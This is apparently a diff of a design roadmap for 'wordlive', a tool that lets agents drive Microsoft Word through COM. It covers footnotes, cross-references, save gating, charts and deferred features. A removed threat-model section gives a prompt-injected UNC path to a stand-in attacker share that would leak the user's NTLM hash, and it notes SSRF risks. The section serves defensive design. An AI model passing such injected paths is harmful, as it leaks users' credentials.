-  default mirroring the other insert verbs. Section breaks pair with the v0.6
-  `doc.sections` work and unblock per-section headers/footers and page setup.
-- ~~New `WdBreakType` subset in `constants.py` (internal, not exported — mirrors
-  `WdStyleType` / the `XlChartType` plan).~~ ✅ — `PAGE`/`COLUMN`/`SECTION_NEXT_PAGE`/`SECTION_CONTINUOUS`
-  only; line/text-wrapping and even/odd-page section breaks deferred until needed.
-- ~~**exec op:** `insert_break` (anchor_id, kind, before?).~~ ✅ — plus the
-  `insert-break` CLI command and the MCP `word_write` `insert_break` command;
-  `kind` defaults to `page`.
-- **Decisions made during build:** `insert_break` defaults `where="after"`
-  (consistency with `insert_paragraph`/`insert_image`/`insert_table`); the
-  CLI/MCP/op `kind` defaults to `page` (the 90% case). Two ways to page-break,
-  by design: `insert_break(kind="page")` for an explicit one-off mark vs.
-  `format_paragraph(page_break_before=True)` for a reflow-safe property on a
-  styled paragraph — the docs/guide steer agents to the latter for "every
-  Heading 1 starts a page."
-- **v0.12 is now fully shipped** (tables + breaks).
+- **`anchor.read_image() -> (bytes, str)`** — bytes + MIME type (from the part's
+  `pkg:contentType`). Parses the Flat OPC fragment, takes the sole `image/*`
+  part, base64-decodes it.
+- **`doc.images`** — read-only discovery collection (mirrors `doc.lists`/
+  `doc.tables`); `list()` emits `[{index, anchor_id, mime, width, height,
+  alt_text, para}]` so an agent sees what's there before pulling bytes.
+- CLI `wordlive images` (list) + `read-image --anchor-id ID [--out FILE]`
+  (`--out` writes bytes + reports `{path, mime, bytes}`; else base64 + mime in
+  JSON). **No exec op** (extraction is a read, off the `doc.edit()` surface).
+- **Decide during build:** addressing scheme (`image:N` 1-based over
+  `InlineShapes` vs. resolving any single-image text anchor); base64-in-JSON vs.
+  file-out CLI default.
+- **Carry into spec:** `WordOpenXML` always serializes the full package skeleton
+  (~64 KB floor — negligible once images are real-sized); rapid COM access can
+  return `RPC_E_CALL_REJECTED` (already the `WordBusyError` retry class — retry
+  for free). **Untested:** EMF/WMF vector images and cropped-image behavior —
+  exercise both before shipping.
+- **Deferred:** floating-shape / chart-image export; OLE-object extraction;
+  whole-page-to-image (use `snapshot`).
 
-### Table creation / deletion — ✅ shipped
+## Reference apparatus — footnotes / endnotes, TOC
 
-- ~~**`doc.add_table(rows, cols, *, style=None, data=None, header=False)`** plus
-  **`anchor.insert_table(rows, cols, *, where="after", …)`** — `Tables.Add(Range,
-  NumRows, NumColumns)` at the resolved range, then `.Style`, then populate.
-  Returns the v0.4 `Table` wrapper so create → fill → read closes on one
-  object.~~ ✅ — `insert_table` lives on the base `Anchor` (every position
-  anchor gets it for free); `add_table` is sugar for `self.end.insert_table(...)`.
-- ~~**`Table.delete()`** — the missing mirror of v0.4's `add_row` /
-  `delete_row`.~~ ✅
-- ~~**Populate at creation.** `data` is a row-major 2-D list, validated against
-  `rows × cols` up front so a wrong shape is a clean `OpError`. `header=True`
-  styles row 1.~~ ✅ — validation *allows underfill* (short/partial `data`
-  leaves trailing cells empty, matching `add_row`) and rejects only overflow,
-  which is the case that would otherwise blow up mid-insert. `header=True` bolds
-  row 1 (shading deferred — bold reads as a header and needs no constant).
-- ~~**Anchoring.** Creation takes a *position* anchor through `anchor_by_id`;
-  the bare `table:N` continues to address existing tables. The op reports the
-  new table's 1-based index.~~ ✅ — the index is reported on the CLI/MCP single
-  call, and a successful `exec` batch now carries an **`outputs`** array
-  (`{index, op, table, rows, columns}` per structure-creating op), since
-  `run_batch` previously discarded per-op results.
-- ~~**exec ops:** `create_table` / `delete_table`.~~ ✅
-- ~~**CLI:** `wordlive table create … [--data -]` and `wordlive table
-  delete N`.~~ ✅
-- **Decisions made during build:** `style=None` → built-in **`Table Grid`**
-  (visible borders beat invisible gridlines for a thing called "a table"; falls
-  back to no style only if the doc somehow lacks it). AutoFit left at Word's
-  default (fixed column widths) — a fit-window/fit-content policy is a later
-  polish, not a blocker.
-- **Discovered during the live smoke test — adjacent tables merge.** Word
-  *silently fuses* two tables that touch with no paragraph mark between them, so
-  appending a second table at the end (or dropping one beside another) merged
-  them into a single ragged grid. `insert_table` now probes
-  `Range.Information(wdWithInTable)` on each side of the insertion point and
-  drops a separator paragraph wherever it abuts an existing table; ordinary
-  insertions into body text get no stray paragraph. This is the kind of bug only
-  a real-Word run surfaces — the mock can't model the merge.
-- **Deferred (unchanged):** merged/split cells, `add_column` / `delete_column`.
-
----
-
-## v0.13 — reference apparatus: footnotes, endnotes, TOC
-
-Status: approved 2026-05-31. The "reference scaffolding" track — all three are
-note/field structures that attach to a range, so they fit the anchor model the
-same way `insert_table` / `insert_image` did.
+Note/field structures that attach to a range, so they fit the anchor model like
+`insert_table`/`insert_image` did. Spike-confirmed 2026-05-31 (live Word).
 
 ### Footnotes & endnotes
 
-- **`anchor.insert_footnote(text, *, where="after")` /
-  `anchor.insert_endnote(text, …)`** on the base `Anchor` —
-  `Range.Footnotes.Add(Range, Reference="", Text=text)` (Endnotes mirror it).
-  Empty `Reference` = Word auto-numbers (the 90% case; a custom mark is
-  deferred). The reference mark lands at the anchor's collapsed range; the note
-  body is `text`. Lands inside `doc.edit()` for one-Ctrl-Z undo.
-- **`doc.footnotes` / `doc.endnotes`** — read-only discovery collections (mirror
-  `doc.lists` / `doc.tables`). `list()` emits `[{index, marker, text, para}]`,
-  so an agent sees each note and the `para:N` its mark sits in before touching
-  anything.
-- **Addressing:** `footnote:N` / `endnote:N`, 1-based over `doc.Footnotes` /
-  `doc.Endnotes`, resolving to the **note-body range** — so `set_text` edits the
-  note text and `.delete()` removes mark + note together.
-- **exec ops:** `insert_footnote` / `insert_endnote` (anchor_id, text, where?).
-- **CLI:** `wordlive insert-footnote --anchor-id ID --text …` (and `-endnote`);
-  `wordlive footnotes` / `wordlive endnotes` (list).
-- **MCP:** `word_write` `insert_footnote`/`insert_endnote`; `word_read`
-  `footnotes`/`endnotes`.
-- **Deferred:** custom reference marks, separators, numbering format/restart,
+- **`anchor.insert_footnote(text, *, where="after")` / `insert_endnote(...)`** —
+  `Range.Footnotes.Add(Range, Reference="", Text=text)` (endnotes mirror).
+  **Spike gotcha:** args must be **positional** — the `Text=` keyword is silently
+  dropped under pywin32 late binding. Empty `Reference` auto-numbers (mark `\x02`).
+- **`doc.footnotes` / `doc.endnotes`** — read-only discovery; `list()` emits
+  `[{index, marker, text, para}]`.
+- **Addressing:** `footnote:N` / `endnote:N`, 1-based, resolving to the
+  **note-body range** (its own story, `StoryType == 2`; `note.Range.Text`
+  round-trips) — so `set_text` edits the note and `.delete()` removes mark + note.
+- exec ops `insert_footnote`/`insert_endnote`; CLI `insert-footnote`/`-endnote`
+  + `footnotes`/`endnotes` lists; MCP mirrors.
+- **Deferred:** custom marks, separators, numbering format/restart,
   footnote↔endnote conversion.
-- **Spike-confirmed (2026-05-31, live Word):** `Footnotes.Add` / `Endnotes.Add`
-  must take their args **positionally** — `Footnotes.Add(rng, "", text)` lands the
-  body, but the `Text=` *keyword* is silently dropped under pywin32 late binding
-  (reads back `''`). Empty `Reference` auto-numbers (mark char `\x02`). The
-  note-body lives in its own story (`Range.StoryType == 2`); `note.Range.Text`
-  round-trips read/write, so `footnote:N` → note-body range + `set_text` works as
-  designed.
 
 ### Table of contents
 
-- **`anchor.insert_toc(*, levels=(1, 3), use_heading_styles=True,
-  hyperlinks=True, where="after")`** + **`doc.add_toc(...)`** sugar
-  (= `doc.start.insert_toc(...)`, the usual top-of-doc placement). COM:
-  `doc.TablesOfContents.Add(Range, UseHeadingStyles=True, UpperHeadingLevel=lo,
-  LowerHeadingLevel=hi, UseHyperlinks=True)`. `hyperlinks=True` makes entries
-  clickable (in-doc navigation an agent can drive).
-- **Page numbers need repagination.** A TOC is a field; numbers are correct only
-  after layout. Expose **`toc.update()`** (`TableOfContents.Update()`) and steer
-  the guide to call it (or `snapshot`, which forces print layout) before reading
-  page numbers back.
-- **`doc.update_fields()`** — small companion primitive (`doc.Fields.Update()`):
-  TOC, cross-refs, and `{ PAGE }` all need a field refresh, so one verb covers
-  them. CLI `wordlive update-fields`; MCP `word_write update_fields`.
-- **exec op:** `insert_toc` (anchor_id, levels?, hyperlinks?).
-- **CLI:** `wordlive insert-toc --anchor-id ID [--levels 1-3] [--no-hyperlinks]`.
-- **MCP:** `word_write` `insert_toc`.
-- **Deferred:** table of figures/authorities, custom TOC field codes, explicit
-  per-style level mapping (`\t` switches), index generation.
-- **Spike-confirmed (2026-05-31):** `TablesOfContents.Add(...)` + `.Update()`
-  builds the TOC and renders entries (`"First Heading\t1 | Second Heading\t1"`)
-  — page numbers populate after `Update()`, as expected.
+- **`anchor.insert_toc(*, levels=(1,3), use_heading_styles=True, hyperlinks=True,
+  where="after")`** + **`doc.add_toc(...)`** sugar (= `doc.start.insert_toc`).
+  COM `TablesOfContents.Add(...)`. Spike-confirmed: builds + renders entries;
+  page numbers populate after `Update()`.
+- **Page numbers need repagination** — expose **`toc.update()`** and steer the
+  guide to call it (or `snapshot`, which forces print layout) before reading
+  page numbers.
+- **`doc.update_fields()`** — companion (`Fields.Update()`); one verb for TOC,
+  cross-refs, `{ PAGE }`. CLI `update-fields`; MCP `word_write update_fields`.
+  (Generalized by the Part-II field primitive above.)
+- exec op `insert_toc`; CLI `insert-toc`; MCP mirror.
+- **Deferred:** table of figures/authorities, custom field codes, explicit
+  per-style level mapping, index generation.
 
----
+## Anchoring & linking — bookmark creation, hyperlinks, cross-references, captions
 
-## v0.14 — anchoring & linking: bookmark creation, hyperlinks, cross-references, captions
+These cluster because **creating a named anchor is the prerequisite for the
+rest** — cross-refs and internal hyperlinks both target a bookmark. Build in
+this order. Spike-confirmed 2026-05-31.
 
-Status: approved 2026-05-31. These cluster because **creating a named anchor is
-the prerequisite for the rest** — cross-references and internal hyperlinks both
-target a bookmark. Build in this order.
-
-### Bookmark creation (do first)
+### Bookmark creation (first)
 
 - **`doc.bookmarks.add(name, anchor)`** — `Range.Bookmarks.Add(Name, Range)` over
-  the resolved anchor's range; `anchor` is an id (`anchor_by_id`) or an `Anchor`.
-  Validates `name` against Word's rules (letters/digits/underscores, leading
-  letter, no spaces) → typed error before mutating. Closes the gap where
-  `bookmarks[name]` could only read/write *existing* bookmarks (`Bookmarks.Add`
-  is internal-only today — overwrite-preservation in `Bookmark.set_text`).
-- **exec op:** `add_bookmark` (name, anchor_id). **CLI:** `wordlive bookmark add
-  NAME --anchor-id ID`. **MCP:** `word_write` `add_bookmark`.
+  the resolved anchor; `anchor` is an id or an `Anchor`. Validates `name` against
+  Word's rules (letters/digits/underscores, leading letter, no spaces) → typed
+  error before mutating. Closes the gap where `bookmarks[name]` could only
+  read/write *existing* bookmarks.
+- exec op `add_bookmark`; CLI `bookmark add NAME --anchor-id ID`; MCP mirror.
 
 ### Hyperlinks
 
 - **`anchor.link_to(address=None, *, bookmark=None, text=None, screen_tip=None)`**
-  — `address` XOR `bookmark` (external URL vs. internal jump to a bookmark).
-  `Range.Hyperlinks.Add(Anchor=range, Address=url, SubAddress=bookmark,
-  TextToDisplay=text)`. `text=None` turns the anchor's existing range into the
-  link (keeps its text); `text=…` inserts new linked text.
-- **exec op:** `add_hyperlink`. **CLI:** `wordlive link --anchor-id ID (--url U |
-  --bookmark B) [--text T]`. **MCP:** `word_write` `add_hyperlink`.
-- **Deferred:** hyperlink read-back collection (`doc.hyperlinks`);
-  editing/removing an existing link.
+  — `address` XOR `bookmark` (external URL vs. internal jump). `text=None` links
+  the existing range; `text=…` inserts new linked text.
+- exec op `add_hyperlink`; CLI `link --anchor-id ID (--url U | --bookmark B)
+  [--text T]`; MCP mirror. **Deferred:** `doc.hyperlinks` read-back;
+  editing/removing a link.
 
-### Cross-references (the approved design pass)
+### Cross-references
 
 - **`anchor.insert_cross_reference(target, *, kind="text", hyperlink=True,
-  where="after")`** — `target` is an anchor id we can map: `bookmark:NAME`,
-  `heading:N`, `footnote:N`/`endnote:N`. `kind` = what to display: `"text"`
-  (referenced text/caption) · `"page"` (page number) · `"number"`
-  (paragraph/heading number) · `"above_below"` ("above"/"below"). Maps to
-  `WdReferenceKind`.
-- **The awkward bit, resolved.** `Range.InsertCrossReference(ReferenceType,
-  ReferenceKind, ReferenceItem, InsertAsHyperlink, IncludePositionInformation)`
-  takes `ReferenceItem` as a **1-based index into
-  `doc.GetCrossReferenceItems(ReferenceType)`**, not our anchor ids. The mapping
-  layer: `bookmark:NAME` → position of NAME in the bookmark item list;
-  `heading:N` (paragraph index) → its position in the heading item list;
-  `footnote:N` → N directly. A target Word can't resolve to an item raises
-  `AnchorNotFoundError` (exit 2) before mutating.
-- New internal `WdReferenceType` / `WdReferenceKind` enum subsets in
-  `constants.py` (not exported — mirrors `WdStyleType` / `XlChartType`).
-- **exec op:** `insert_cross_reference` (anchor_id, target, kind?, hyperlink?).
-  **CLI:** `wordlive cross-ref --anchor-id ID --target bookmark:Foo --kind page`.
-  **MCP:** `word_write` `insert_cross_reference`.
-- **Deferred:** cross-refs to numbered-list items and equations;
-  `IncludePositionInformation` (above/below + page combos).
-- **Spike-confirmed (2026-05-31, live Word):** the mechanism is sound and
-  *less* fiddly than feared. `Range.Bookmarks.Add(Name, Range)` creates the
-  named anchor (`Exists` → True). `GetCrossReferenceItems(refType)` returns an
-  ordered, 1-based list of **strings** — heading *text* for headings, bookmark
-  *names* for bookmarks — so `bookmark:NAME` → `items.index(NAME)+1` and
-  `heading:N` → its ordinal among headings both map cleanly.
-  `InsertCrossReference` inserts a live `{ REF _Ref… \h }` field for heading and
-  bookmark targets. **Gotcha:** passing `IncludePositionInformation=` as a
-  keyword raises "unexpected keyword argument" under pywin32 — omit it or pass
-  positionally (same late-binding issue as the footnote `Text` arg). The
-  `ReferenceKind` → field-switch detail (`\p` for page number) still wants a
-  build-time check; both `-1` and `7` inserted a field but emitted the same
-  `\h`-only code in the quick sweep.
+  where="after")`** — `target` is an anchor id we map: `bookmark:NAME`,
+  `heading:N`, `footnote:N`/`endnote:N`. `kind` = text/page/number/above_below.
+- **The mapping layer (spike-confirmed):** `InsertCrossReference`'s
+  `ReferenceItem` is a 1-based index into `GetCrossReferenceItems(ReferenceType)`,
+  which returns ordered **strings** — heading *text* / bookmark *names* — so
+  `bookmark:NAME` → `items.index(NAME)+1` and `heading:N` → its ordinal among
+  headings map cleanly. Unresolvable target → `AnchorNotFoundError` (exit 2)
+  before mutating.
+- **Gotcha:** `IncludePositionInformation=` as a keyword raises under pywin32 —
+  omit or pass positionally. `ReferenceKind`→field-switch (`\p` for page) wants a
+  build-time check.
+- New internal `WdReferenceType`/`WdReferenceKind` enum subsets. exec op
+  `insert_cross_reference`; CLI `cross-ref`; MCP mirror. **Deferred:** cross-refs
+  to numbered-list items / equations; `IncludePositionInformation` combos.
 
 ### Captions (rounds out the figure/table workflow)
 
-- **`anchor.insert_caption(label="Figure", *, text=None, where="after")`** —
-  `Range.InsertCaption(Label, Title=text)`. Built-in labels Figure/Table/Equation
-  or a custom string; auto-numbers per label. Pairs with cross-references
-  (cross-ref a captioned figure). Lower priority than the three above — ship if
-  cheap, else fold into a follow-up.
-- **Deferred:** caption numbering format/chapter-style; the table-of-figures that
-  consumes captions.
+- **`anchor.insert_caption(label="Figure", *, text=None, where="after")`** →
+  `Range.InsertCaption(Label, Title=text)`. Built-in Figure/Table/Equation or
+  custom; auto-numbers per label. Pairs with cross-references. Ship if cheap,
+  else fold into a follow-up. **Deferred:** numbering format/chapter-style;
+  table-of-figures.
 
----
+## Persistence — save / save-as / PDF export (directory-whitelisted)
 
-## v0.15 — the LLM-facing filesystem boundary: persistence + image-source hardening
+wordlive's one coherent **filesystem boundary**: the **Python API is
+trusted/ungated**; the **CLI/MCP surfaces are gated** because their input can be
+prompt-injected. (The read side — image-source hardening — is bundled with this;
+see Deferred/Cross-cutting.)
 
-Status: approved 2026-05-31. wordlive's one coherent **filesystem boundary**
-for agent-driven surfaces, covering both directions: **writes** (save / export)
-and **reads** (image sources). The boundary is the same in both — the **Python
-API is trusted/ungated**; the **CLI/MCP surfaces are gated** because their input
-can be prompt-injected. Designing the read and write gates together keeps one
-mental model (allowed-directory lists, resolve-then-contain, typed denial) and
-one set of docs, rather than two ad-hoc rules.
-
-### Persistence — save / save-as / PDF export (directory-whitelisted)
-
-The first surface that *writes* to the filesystem, so the design is a *gate*,
-not a verb. COM is trivial (`Document.Save`, `SaveAs2`, and `ExportAsFixedFormat`
-— already used by `_snapshot.py`); the contract is what keeps an agent from
-silently overwriting the user's files.
-
-- **Python API is ungated** (it's a library; the calling human is trusted):
-  `doc.save()` (in-place; errors if the doc has no path yet),
+- **Python API (ungated):** `doc.save()` (errors if no path yet),
   `doc.save_as(path, *, fmt="docx", overwrite=False)`,
-  `doc.export_pdf(path, *, from_page=None, to_page=None)`, plus `doc.saved`
-  (dirty-flag read) and `doc.path` (read).
-- **LLM-facing surfaces (CLI/MCP) are default-deny with a directory whitelist.**
-  Saving is enabled only by configuring **allowed directories**; a save whose
-  *resolved target* is not inside a whitelisted dir is rejected. Empty whitelist
-  = no saving at all (the default).
-  - **CLI:** `--save-dir DIR` (repeatable) on the save/export commands, and/or
-    `WORDLIVE_SAVE_DIRS` (`os.pathsep`-separated) as a session default.
-  - **MCP:** the long-running server is launched with its allowed dirs (CLI arg /
-    env / bundle config); `word_write` `save`/`save_as`/`export_pdf` check the
-    configured whitelist. The operator configures once; the agent can't widen it.
-  - **Containment check:** `Path(target).resolve()` then `is_relative_to` against
-    each resolved whitelist dir — resolve *first* so `..`/symlink escapes can't
-    slip a write outside the allowed tree.
-  - **Plain `Save()` (overwrite the open doc) is gated too** — its target is the
-    doc's *existing* path, which must also sit inside the whitelist, so an agent
-    can't silently overwrite a document the user opened from elsewhere. Stated
-    explicitly because it's the surprising case.
-- **New typed error `SaveNotAllowedError(WordliveError)` → exit 1.** It's a
-  *policy denial / bad-input*, not a named-thing-missing, so it does **not**
-  subclass `AnchorNotFoundError` — the six-code exit contract is untouched.
-- **Not an exec op.** A save is a terminal side-effect with no undo, so it stays
-  off the `doc.edit()` batch surface (same reasoning that kept `read_image` and
-  `write_cursor` off). CLI/MCP single commands only.
-- **Formats:** `docx` (default) + `pdf` (export) first; `doc`/`rtf`/`txt`/`html`
-  via `WdSaveFormat` deferred until asked.
-- **Guide/MCP docs:** state plainly that saving is **off** unless the operator
-  whitelists directories, and that PDF export is the recommended "hand back a
-  deliverable" path (it pairs with `snapshot`).
+  `doc.export_pdf(path, *, from_page=None, to_page=None)`, `doc.saved`,
+  `doc.path`.
+- **CLI/MCP (default-deny + directory whitelist):** saving enabled only by
+  configuring **allowed directories** (`--save-dir DIR` repeatable /
+  `WORDLIVE_SAVE_DIRS`; MCP configured at launch). Empty whitelist = no saving
+  (default). **Containment:** `Path(target).resolve()` *then* `is_relative_to`
+  each whitelist dir (resolve first so `..`/symlink escapes can't slip out).
+  Plain `Save()` is gated too (its target is the doc's existing path, which must
+  also sit inside the whitelist).
+- **`SaveNotAllowedError(WordliveError)` → exit 1** (policy denial / bad-input,
+  **not** AnchorNotFound — six-code contract untouched). Likely renamed to a
+  neutral `PathNotAllowedError` once it also guards image-source reads.
+- **Not an exec op** (terminal side-effect, no undo). **Formats:** `docx` + `pdf`
+  first; `doc`/`rtf`/`txt`/`html` deferred. Guide: saving is **off** unless an
+  operator whitelists dirs; PDF export is the recommended "hand back a
+  deliverable" path (pairs with `snapshot`).
 
-### Image-source hardening (read side) — raised 2026-05-31
+## Charts (Excel-backed)
 
-`insert_image --path …` (v0.8) hands `FileName` to
-`InlineShapes.AddPicture(LinkToFile=False)`, which resolves more than local
-paths. That makes the *path* input (not base64/bytes — those carry their own
-data and never touch the FS/network) an attack surface a prompt injection can
-reach. Threat model:
+Approved 2026-05-31 as the SmartArt substitute. `Range.InlineShapes.AddChart2`
+embeds a chart whose data lives in an embedded Excel workbook. Heavier than
+images on two axes (a new dependency + a much larger surface), hence lower
+priority than the publishing cluster.
 
-- **UNC path → NTLM credential theft (sharpest, Windows-specific).** An injected
-  `--path \\attacker\share\x.png` forces Word to authenticate over SMB to an
-  attacker host, leaking the user's NetNTLMv2 hash. Worse: `image_on_disk`'s own
-  `Path(p).is_file()` *classification* probe triggers the SMB auth **before** COM
-  is reached, so the leak fires even when the target isn't an image.
-- **URL → SSRF.** `http(s)://…` would make Word issue the request. *Incidentally
-  closed today* — `Path("http://…").is_file()` is False, so it falls through to
-  base64-decode and raises `ImageSourceError` before COM. Load-bearing accident;
-  the gate should make it intentional.
-- **Local image-file disclosure.** Any readable *image* anywhere on disk embeds
-  into a doc that may then be shared. Bounded to real images (Word rejects
-  non-image bytes, so this is not an arbitrary-file exfil), but a private
-  screenshot/diagram is in scope.
-
-Mitigation — the read mirror of the save whitelist:
-
-- **Python API ungated** (a developer passing a UNC path is making a choice —
-  same boundary as `doc.save()`).
-- **CLI/MCP, always:** reject non-local `FileName`s — UNC (`\\…`) and explicit
-  URL/`file://` schemes — **before** the `is_file()` probe, so classification
-  itself can't leak. Cheap, no legitimate-use cost, kills the NTLM/SSRF vectors.
-- **CLI/MCP, optional defense-in-depth:** a read-directory allowlist (`--image-dir`
-  / `WORDLIVE_IMAGE_DIRS`, the exact mirror of `--save-dir`) for local-disclosure;
-  configured → a path source must resolve within it; unconfigured → any *local*
-  path (back-compat), with UNC/URL still blocked.
-- **Steer MCP toward base64/bytes** — inherently safe (agent supplies the bytes,
-  no FS/network touch) and already the priority LLM path.
-- **Typed error** reuses the v0.15 denial type (`SaveNotAllowedError` likely
-  renamed to a neutral `PathNotAllowedError` once it guards reads *and* writes)
-  → exit 1.
-- **Note:** `LinkToFile=False` means the fetch is **one-shot at insert time**, not
-  a stored auto-refreshing link — so the blast radius is the single insert call,
-  not a persistent link in the saved doc.
+- **`anchor.insert_chart(kind, data, *, title=None)`** — `kind` → `XlChartType`
+  (`bar`→`xlColumnClustered`, `pie`→`xlPie`, `scatter`→`xlXYScatter`,
+  `line`→`xlLine`); `data` (flat label→value mapping) populates
+  `ChartData.Workbook.Worksheets(1)`.
+- **Transitive Excel dependency** — `AddChart2` spins up hidden Excel. Gate
+  behind an "is Excel available?" probe + a typed error (clean exit, not exit 1).
+- `XlChartType` subset in `constants.py` (internal). **Keep narrow:** common
+  kinds + flat `data` only. **Deferred:** multi-series, secondary axes,
+  axis/series formatting, `BreakLink` policy, reading existing charts back out.
 
 ---
 
-## v0.11+ — defer
+# Part III — Deferred & declined
 
-- **Events / sinks** — `WithEvents(word.com, Handler)` for
-  `DocumentBeforeSave`, `WindowSelectionChange`. Wait for a concrete use
-  case before designing the marshalling layer.
+## Declined
+
+- **Native SmartArt** — declined 2026-05-31. `Shapes.AddSmartArt(Layout, …)` +
+  driving the `Nodes` tree is heavy and brittle (GUID-indexed layouts from
+  `Application.SmartArtLayouts`, floating-only, hard to read back,
+  locale/version-sensitive) for an intent that **charts** (Part II) and
+  **render-diagram-to-image** (mermaid/graphviz → `insert_image`) already serve.
+  Revisit only on a concrete SmartArt-specific need.
+
+## Deferred (no concrete trigger yet)
+
+- **Events / sinks** — `WithEvents(word.com, Handler)` for `DocumentBeforeSave`,
+  `WindowSelectionChange`. Wait for a use case before designing the marshalling
+  layer.
 - **`asyncio` wrapper** — natural once events land. Sync core stays.
-- **Read-model caching** — premature. Live reads are correct; cache when
-  events arrive to invalidate on `DocumentChange`.
-- **Styles deep cuts** — character styles, list styles, theme-aware fonts.
-  Cover paragraph styles in v0.2 first, see what's actually missing.
-- **PageSetup writes** — margins, orientation, page size. Reads shipped in
-  v0.6; writes want their own small pass (units, section-vs-document scope).
-- **Native SmartArt** — considered and **declined 2026-05-31**.
-  `Shapes.AddSmartArt(Layout, …)` + driving the `Nodes` tree is heavy and
-  brittle (GUID-indexed layouts from `Application.SmartArtLayouts`, floating-only,
-  hard to read back, locale/version-sensitive) for an intent that charts (v0.10)
-  and render-diagram-to-image (mermaid/graphviz → `insert_image`) already serve.
-  Revisit only if a concrete SmartArt-specific need appears.
+- **Read-model caching** — premature; live reads are correct. Cache when events
+  arrive to invalidate on `DocumentChange`.
+- **Styles deep cuts** — character/list/linked styles, theme-aware fonts, style
+  import from template, `UpdateStyles`. (Basic style *creation* promoted to
+  Part II.)
+- **Document themes** — `Document.DocumentTheme` / `ApplyTheme`, theme color/font
+  schemes. Brand-consistency play; revisit after style creation lands.
+- **Equations** — `Range.OMaths.Add` / build. Scientific-publishing niche;
+  heavier than the Part-II flourishes.
+- **Table polish** — merged/split cells (addressing assumes rectangular),
+  `add_column`/`delete_column`, AutoFit fit-window/fit-content policy.
+- **List polish** — custom list-template authoring, per-level bullet/number
+  format, multi-section `LinkToPrevious` editing.
+- **Comment/revision polish** — comment replies (`comment.reply`), per-revision
+  accept/reject (`doc.revisions`), author/date filtering on `list()`.
+- **Image polish** — wrap *side* + text distance; absolute/relative positioning
+  (`Left`/`Top`); cropping; replace-in-place; force-own-paragraph; EMF/WMF.
+- **Cursor/inline polish** — raw inline `insert_before`/`insert_after` (no new
+  paragraph) on the CLI; a `write_cursor` exec op (fights `EditScope`'s
+  cursor-restore in a batch).
+
+## Unexplored COM control surfaces (catalogue for prioritization)
+
+Sketched 2026-06-01 — the broader sweep of "what else could an agent drive
+through COM that's actually useful." **Nothing here is approved or designed**;
+it's a parking lot to prioritize from. Each entry: the COM entry point, the
+agent use-case, and a rough **weight** (leverage vs. cost/risk). Entries are
+filtered for usefulness — Word exposes far more (page borders art, ink,
+hyphenation dictionaries, etc.) that isn't worth an agent's attention.
+
+Cross-cutting constraint: anything here must still honour the four invariants.
+The **application/window/view** surfaces (group I) are the ones in real tension
+with *politeness* — they change global UI state, not document content — so they
+need a louder opt-in than an ordinary edit, or should stay reads.
+
+### A. Proofing & language (mostly reads — high agent value, low risk)
+
+- **Spelling / grammar as structured data** — `Range.SpellingErrors`,
+  `GrammaticalErrors`, `Application.GetSpellingSuggestions`. An agent can
+  proofread and propose fixes (pairs naturally with comments / track-changes).
+  *Weight: high value, low risk — a read surface that fits the agent loop.*
+- **Readability statistics** — `Document.ComputeStatistics(wdStatistic…)` /
+  the readability scores. "How dense is section 3." *Low cost.*
+- **AutoCorrect / AutoText entries** — `Application.AutoCorrect`. Niche; mostly
+  a write to global app state. *Low priority.*
+
+### B. Document metadata & properties (reads + light writes)
+
+- **Built-in & custom document properties** — `BuiltInDocumentProperties`
+  (Title/Author/Subject/Keywords/Company/Category), `CustomDocumentProperties`.
+  Read for situational awareness; write to stamp a generated deliverable.
+  *Weight: medium, cheap.*
+- **Document variables** — `Document.Variables` (`{ DOCVARIABLE }` backing).
+  Data-driven templates: set a variable, refresh fields. *Pairs with the field
+  primitive.*
+- **Statistics** — page/word/char/line counts via `ComputeStatistics`. *Cheap
+  read; useful before/after an edit.*
+
+### C. Document lifecycle & safety
+
+- **Protection / editing restrictions** — `Document.Protect(type, …)` /
+  `Unprotect`, read-only enforcement, `Permission` (IRM). Hand back a locked
+  deliverable. *Weight: medium; gated like persistence (policy surface).*
+- **Encryption / passwords** — `Document.Password` / `WritePassword`. *Security-
+  sensitive; gate hard or leave to the human.*
+- **Compare / merge** — `Application.CompareDocuments`, `Document.Merge`. "Diff
+  these two drafts" as tracked revisions — genuinely agent-shaped. *Weight:
+  medium-high; needs a second-document handle in the model.*
+- **Inspect / redact** — remove personal info / hidden data. *Niche; policy.*
+- **Digital signatures** — `Document.Signatures`. *Low priority.*
+
+### D. Mail merge & data-driven generation
+
+- **`Document.MailMerge`** — data source, merge fields, `Execute` to a new doc /
+  printer / email. The canonical "generate N letters from a table" workflow —
+  directly in wordlive's document-generation wheelhouse, but a large surface
+  (data-source binding, field mapping, output routing). *Weight: high value,
+  high cost — its own multi-step design pass.*
+
+### E. Structured & data-bound content
+
+- **Content-control *creation*** — today wordlive reads/writes existing CCs;
+  `ContentControls.Add(type, range)` would let an agent *build* form-like docs
+  (rich-text / dropdown / date / checkbox / repeating-section types), optionally
+  XML-mapped. *Weight: medium-high for template generation.*
+- **Custom XML parts / data binding** — `Document.CustomXMLParts`, binding CCs to
+  XML nodes. Powerful for structured generation; heavier and niche. *Defer below
+  CC creation.*
+- **Legacy form fields** — `Document.FormFields`. *Superseded by content
+  controls; skip unless asked.*
+
+### F. Reference apparatus — extensions (after the Part-II footnotes/TOC/captions)
+
+- **Index** — `Document.Indexes.Add`, `Range.MarkIndexEntry`. Back-of-book index.
+- **Table of figures / authorities** — `TablesOfFigures`, `TablesOfAuthorities`.
+  Consume the Part-II captions.
+- **Citations & bibliography** — `Document.Bibliography`, `Sources`,
+  `Range.InsertCitation`. Academic-writing workflow. *Weight: medium; cohesive
+  once footnotes ship.*
+
+### G. Drawing layer (floating shapes & embedded objects)
+
+- **General `Document.Shapes`** — lines, connectors, freeform, grouping, z-order,
+  rotation, fill/gradient/picture-fill, shadow/3D. The watermark/text-box
+  flourishes (Part II) are the thin edge; the full drawing layer is large and
+  floating-only (hard to read back, fights the anchor model). *Weight: low —
+  cherry-pick specific shapes (callout line, divider) rather than the whole API.*
+- **Embedded / OLE objects** — `InlineShapes.AddOLEObject` (embed an Excel range,
+  a PDF, another doc). *Medium-niche; pairs with charts.*
+
+### H. Range / navigation read surface (cheap, high agent value)
+
+- **`Range.Information(wd…)`** — computed reads: page number, line number,
+  in-table, end-of-row, zoom, caps-lock, … Lets an agent answer "what page is
+  this on" *without* a snapshot. *Weight: high value, low cost.*
+- **Story ranges** — `Document.StoryRanges` / `StoryType` iteration (main text,
+  footnotes, headers, text frames, comments as distinct stories). Makes
+  find/read *story-aware* instead of main-text-only. *Weight: medium; sharpens
+  existing reads.*
+- **Range unit navigation** — `Expand`/`Collapse`/`MoveStart/End`,
+  sentence/word/paragraph units. Building blocks for finer anchors. *Low,
+  incremental.*
+
